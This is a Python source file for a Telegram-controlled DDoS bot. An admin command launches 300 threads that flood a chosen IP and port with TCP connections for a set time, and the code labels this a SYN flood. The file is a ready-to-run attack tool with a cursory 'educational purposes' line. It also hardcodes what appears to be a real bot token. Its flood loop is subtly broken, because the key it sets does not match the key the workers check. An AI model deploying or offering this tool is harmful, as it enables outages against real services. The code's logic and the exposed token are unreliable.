import telebot
import socket
import threading
import random
import time
import asyncio
from telebot import types

# Telegram Bot Token (get from @BotFather)
BOT_TOKEN = "8641607483:AAHFQ_au5v1XPereB-LOHF1fyE6_6ktdJQQ"
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user ID (your Telegram user ID)
ADMIN_ID = 5724010049  # Replace with your user ID

class TelegramDDoS:
    def __init__(self):
        self.active_attacks = {}
    
    def syn_flood_worker(self, target_ip, target_port):
        """Worker thread for SYN flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            while self.active_attacks.get((target_ip, target_port), False):
                sock.connect((target_ip, target_port))
        except:
            pass
    
    def start_attack(self, user_id, target_ip, target_port, duration):
        """Start DDoS attack"""
        if user_id != ADMIN_ID:
            return False
        
        attack_id = f"{target_ip}:{target_port}"
        self.active_attacks[attack_id] = True
        
        threads = []
        thread_count = 300
        
        for i in range(thread_count):
            t = threading.Thread(target=self.syn_flood_worker, args=(target_ip, target_port))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Run for duration
        time.sleep(duration)
        self.active_attacks[attack_id] = False
        
        return True

ddos = TelegramDDoS()

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == ADMIN_ID:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("/attack ip port seconds")
        btn2 = types.KeyboardButton("/status")
        btn3 = types.KeyboardButton("/stop")
        markup.add(btn1, btn2, btn3)
        bot.reply_to(message, "🚀 DDoS Bot Ready!\n/attack 192.168.1.1 80 30", reply_markup=markup)
    else:
        bot.reply_to(message, "❌ Unauthorized")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    try:
        if message.from_user.id != ADMIN_ID:
            bot.reply_to(message, "❌ Access denied")
            return
        
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "❌ Usage: /attack IP PORT SECONDS\nExample: /attack 192.168.1.1 80 30")
            return
        
        ip, port, seconds = parts[1], int(parts[2]), int(parts[3])
        
        # Validate IP
        socket.inet_aton(ip)
        
        bot.reply_to(message, f"🔥 Starting attack on {ip}:{port} for {seconds}s...")
        
        # Start attack in background
        threading.Thread(target=ddos.start_attack, args=(message.from_user.id, ip, port, seconds), daemon=True).start()
        
        bot.reply_to(message, f"✅ Attack launched!\n📊 Threads: 300 | Target: {ip}:{port}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status(message):
    if message.from_user.id == ADMIN_ID:
        active = [k for k,v in ddos.active_attacks.items() if v]
        if active:
            status_text = "📈 Active Attacks:\n" + "\n".join(active)
        else:
            status_text = "⏸️ No active attacks"
        bot.reply_to(message, status_text)

@bot.message_handler(commands=['stop'])
def stop(message):
    if message.from_user.id == ADMIN_ID:
        ddos.active_attacks.clear()
        bot.reply_to(message, "🛑 All attacks stopped")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    help_text = """
🤖 DDoS Bot Commands:

/start - Show menu
/attack IP PORT SECONDS - Start attack
/status - Check active attacks
/stop - Stop all attacks
/help - Show this help

Example:
/attack 192.168.1.1 80 30
    """
    bot.reply_to(message, help_text)

# Run bot
if __name__ == "__main__":
    print("🤖 Telegram DDoS Bot Started!")
    print("⚠️  Only for educational purposes")
    bot.polling(none_stop=True)
